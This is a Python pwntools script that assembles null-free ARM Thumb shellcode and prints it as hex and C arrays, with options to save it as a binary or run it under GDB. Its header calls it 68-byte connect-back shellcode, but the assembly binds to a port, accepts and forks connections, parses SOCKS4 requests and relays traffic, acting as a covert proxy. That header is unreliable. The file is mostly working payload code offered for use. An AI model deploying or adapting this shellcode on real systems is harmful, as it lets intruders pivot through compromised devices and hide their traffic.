# 68 bytes connect back arm shellcode, without zeroes
#
from pwn import *
import ctypes, struct, sys, os, socket

context.update(arch="arm", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
#context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'error'

if (len(sys.argv) < 3):
  print('%s <IP> <PORT> [RUN]' % (sys.argv[0]))
  exit(1)

# define HOST & PORT here or in command line
IP, PORT = (sys.argv[1], int(sys.argv[2],10)) if len(sys.argv) > 2 else ('127.0.0.1', 12490)

def sockaddr():
    family = struct.pack('H', 0xff02)
    portbytes = struct.pack('H', socket.htons(PORT))
    ipbytes = socket.inet_aton(IP)
    number = struct.unpack('Q', family + portbytes + ipbytes)
#    number = -number[0]        #negate
    return hex((number[0] + (1 << 64)) % (1 << 64))

def dumpit(shellc):
  print('shellcode length: {:d} bytes'.format(len(shellc)))
  # dump as hex number array
  print('\n\"\\x{}\"'.format('\\x'.join([format(b, '02x') for b in bytearray(shellc)])))
  # dump as C array
  print("\nunsigned char shellc[] = {{{}}};".format(", ".join([format(b, '#02x') for b in bytearray(shellc)])))
  # dump as hex array
  print('\nproblematic values are highlighted (00,0a,20)...\n')
  print(hexdump(shellc, highlight=b'\x0a\x20\x00'))

shellc = asm ('''
    .code 32
    // switch to thumb mode
    add    r1, pc, #1
    bx     r1
    .code 16
    .arch armv7
    .thumb
    // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    movs r1,#1		// r1 = SOCK_STREAM
    adds r0,r1,#1	// r0 = AF_INET
    lsls    r7, r1, #8  // multiply by 256
    adds    r7, #25     // 256+25 = socket
    eors r2,r2		// r2 = IPPROTO_IP
    svc    1
bind:
    // bind(s, &sa, sizeof(sa));
    adr		r1,#sa
    mov r4,r0		// r4 = socket
    strb	r2, [r1, #1] // null the 0xFF in sa.family
    movs    r2, #16      // r2 = sizeof(sa)
    adds    r7, #1       // r7 = 281+1 = bind
    svc    1
listen:
	eors	r0,r4		// r0 =r4 (as r0 == 0)
    movs    r1, #15      // r1 = backlog
    adds    r7, #2       // r7 = 282+2 = listen
    svc    #1
accept:
	eors	r0,r4		// r0 =r4 (as r0 == 0)
	eors	r1,r1
	eors	r2,r2
	movs	r7,#185
	adds    r7, #100       // r7 = 285 = accept
	svc    	1
	mov		r5,r0
fork:
	movs	r7,#2
	svc		#1
	cbz r0, fork2
wait:
	mov		r1,sp
	eors r2,r2
	eors r3,r3
	movs	r7,#114
	svc		#1
close:
	mov	r0,r5
	movs	r7,#6
	svc		#1
	b	accept
answer:
	mov	r0,r5
	movs	r2,#8
	movs	r7,#4
	svc		#1
	bx	lr
sa:
  .quad %s

nogood:
	movs r3,#0x5b
	strb	r3,[r1,#1]
	bl	answer
exit:
	movs 	r7,#1
	svc		#1

fork2:
	svc		#1
	cbnz r0,exitn

/* read SOCKS first packet*/
read:
	push {r0,r1,r2,r3}		// make space on stack
	mov	r0,r5
	mov		r1,sp
	movs	r2,#9			// length
	movs	r7,#3
	svc		#1
	cmp	r0,#9
exitn:
	bne exit
	ldrh	r0,[r1]
	cmp	r0,#0x104
	bne nogood
socket2:
	movs r1,#1		// r1 = SOCK_STREAM
	adds r0,r1,#1	// r0 = AF_INET
	lsls    r7, r1, #8  // multiply by 256
	adds    r7, #25     // 256+25 = socket
	eors r2,r2		// r2 = IPPROTO_IP
	svc    #1
	mov r4,r0
connect:
	movs	r3,#2
	mov	r1,sp
	strh	r3,[r1]
	movs	r2,#16
	lsls	r7, r2, #4  // multiply by 16
	adds	r7, #27     // 256+27 = connect
	svc		#1
	tst r3,r0		// test if non-zero to avoir zero in opcode
	bne		nogood
	movs r3,#0x5a
	lsls	r3,#8
	strh	r3,[r1]
	bl		answer	

// poll for activity on fds
poll:
// prepare struct pollfd on stack
	movs	r6,#1
	push	{r4,r6}
	push	{r5,r6}
	mov		r0,sp
	movs	r1,#2
	lsls r2,r6,#16		// r2 = 0x10000, timeout , value reused for testing bit too after svc
	movs	r7,#168
	svc		#1

	mov		r1,sp		// r1 -> struct pollfd *
	pop	{r0,r3,r6,r7}	// get back fds and pollevent bits
	tst		r3,r2		// test POLLIN
// for wider compatiblity reason, we do not use it block and conditionnal move in thumb
	bne	next1
	ldr	r0,[r1,#8]
	mov r6,r5

// read a chunk of data on stack
next1:
	movs	r7,#3
	lsls	r2,r7,#10		// buffer size 3<<10 (~3k) you can adjust buff size
	subs	r1,r2			// make space on stack
	svc		#1
	cmp	r0,#1
	blt		exit

	mov	r2,r0
// write chunk to dest fd
copyloop:
	mov	r0,r6
	movs	r7,#4
	svc	#1
	cmp	r0,#1
	blt	exit
	adds	r1,r0
	subs	r2,r0
	bne copyloop
	b	poll


''' % sockaddr())

# remove padding nop added by gas eventually
if shellc[-2:] == b'\x00\xbf':
	shellc=shellc[0:-2]

dumpit(shellc)

if args.EXE:
  ELF.from_bytes(shellc).save('binary')

if args.RUN:
  p = run_shellcode(shellc)
  p.interactive()
elif args.GDB:
  p = debug_shellcode(shellc, gdbscript='''
    # set your pwndbg path here
    source ~/gdb.plugins/pwndbg/gdbinit.py
    set show-flags on
    set show-retaddr-reg on
    set show-compact-regs on
    set arm show-opcode-bytes 1
    context
  ''')
  p.interactive()

